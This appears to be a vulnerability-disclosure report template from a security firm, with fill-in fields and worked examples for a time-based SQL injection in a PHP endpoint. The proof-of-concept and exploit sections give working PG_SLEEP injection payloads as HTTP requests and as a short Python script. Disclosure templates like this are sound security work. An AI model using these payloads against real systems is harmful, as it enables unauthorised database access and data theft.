# Vulnerability Report Template – Fluid Attacks

## 1. Preliminary Information

**Confirmation of Filters:**
- [ ] The software is open-source OR has a demo/free version
- [ ] The software is not in any bug bounty program
- [ ] The software was not created solely for academic purposes
- [ ] The software is not under the scope of any other CNA (checked vendor’s security.md)
- [ ] The software is used in Western countries
- [ ] The software has at least 1,000 stars on GitHub (recommended)
- [ ] The software runs on one or more of the following: Linux, Windows, macOS, Android, iOS

---

**Source Code Link (GitHub/GitLab):** `<link>`  
**Vulnerable Version(s):** `<version or commit hash>`  
**CVSS v4.0 Score & Vector:** `<score> – <vector string>`  
**Vendor Website:** `<link>`  
**Advisory Name (no spaces, artist/band names allowed):** `<name>`  
**Wikipedia or Last.fm Link of the Artist/Band:** `<link>`  
**Discovery Date:** `<YYYY-MM-DD>`  
**CWE ID:** `<CWE-###>`  
**CAPEC ID:** `<CAPEC-###>`  
**Previous Communication with Vendor:** `<Yes/No>` – If yes, provide details.  
**Fluid Attacks Criteria Category:** `<link or category>`  
**Vendor Contact (email):** `<email>`  
**Setup Instructions (How to install and run locally):** `<step-by-step instructions>`  
**Vendor Security Policy Link:** `<link>`  

---

## 2. Description

**Title:** `<Software Name> <Version> – <Vulnerability Type>`

**Description:**  
Provide a brief summary including software name, affected version(s), vulnerability type, and potential impact.  
Example:  
> In `<Software Name>` version `<x.x.x>`, an unauthenticated SQL Injection vulnerability was discovered in the `nm_tipo` and `descricao` parameters of the `educar_tipo_usuario_lst.php` endpoint. Exploiting this flaw allows an attacker to execute arbitrary SQL queries, potentially leading to data exfiltration and full database compromise.

---

## 3. Vulnerability Details

**Vulnerability Type:** `<SQL Injection / XSS / RCE / etc.>`  
**Affected Component/Endpoint:** `<path or module>`  
**Technical Details:**  
Explain how the vulnerability works, referencing relevant code locations if possible.  
Example:  
> The parameters `nm_tipo` and `descricao` are concatenated directly into SQL queries without sanitization, enabling attackers to inject arbitrary SQL commands.

---

## 4. Proof of Concept (PoC)

**HTTP Request Example:**
```
GET /educar_tipo_usuario_lst.php?nm_tipo=1 AND 8767=(SELECT 8767 FROM PG_SLEEP(10))-- HTTP/1.1
Host: vulnerable-site.com
```

**Alternate Parameter Exploitation:**
```
GET /educar_tipo_usuario_lst.php?descricao=1 AND 8767=(SELECT 8767 FROM PG_SLEEP(10))-- HTTP/1.1
Host: vulnerable-site.com
```

**Expected Result:** Normal server response  
**Observed Result:** Delayed response (~10 seconds), confirming time-based injection.

---

## 5. Exploit Code (if applicable)
```python
import requests

url = "https://vulnerable-site.com/educar_tipo_usuario_lst.php"
payload = {"nm_tipo": "1 AND 8767=(SELECT 8767 FROM PG_SLEEP(10))--"}
r = requests.get(url, params=payload)
print(f"Response time: {r.elapsed.total_seconds()} seconds")
```

---

## 6. Evidence of Exploitation

Attach:
- Screenshots of the delayed response
- Screenshot of code location (if public in repo)
- Video recording of PoC execution

---

## 7. Impact

Explain what an attacker could achieve:  
- Unauthorized database access  
- Data exfiltration  
- Data modification or deletion  
- Privilege escalation  

---

## 8. Recommendations

- Implement prepared statements / parameterized queries  
- Validate and sanitize all user inputs  
- Enable database error suppression for production  
- Apply a WAF rule for SQL Injection detection  

---

## 9. Researcher Information

**Name:** `Natan Maia Morette`  
**Email:** `<email>`  

**Attachments:** Include all images and videos in the submission email.
